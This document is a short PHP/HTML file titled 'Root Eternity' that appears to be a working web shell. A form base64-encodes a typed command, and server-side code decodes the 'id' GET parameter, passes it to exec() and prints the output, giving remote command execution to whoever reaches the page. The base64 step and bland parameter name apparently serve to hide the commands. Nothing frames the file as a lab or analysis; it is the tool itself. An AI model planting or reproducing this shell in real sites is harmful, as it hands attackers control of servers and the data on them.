<!DOCTYPE html>
<html>
<head>
    <title>Root Eternity</title>
</head>
<body>
    <script>
    window.onload = function() {
        document.getElementById('execute_form').onsubmit = function () {
            var command = document.getElementById('cmd');
            command.value = window.btoa(command.value);
        };
    };
    </script>
    <form id="execute_form" autocomplete="off" method="get">
        <b>Command</b><input type="text" name="id" id="cmd" autofocus="autofocus" style="width: 500px" />
        <input type="submit" value="Execute" />
    </form>
    <?php
    if (isset($_GET['id'])) {
        $decoded_command = base64_decode($_GET['id']);
        echo "<b>Executed:</b>  $decoded_command<br><br>";
        
        exec($decoded_command . " 2>&1", $output, $return_status);
        
        if ($return_status !== 0) {
            echo "<font color='red'>Error in Code Execution -->  </font>";
        } else {
            echo "<b>Output:</b><br>";
        }
        
        foreach ($output as $line) {
            echo htmlspecialchars($line) . "<br>";
        }
    }
    ?>
</body>
</html>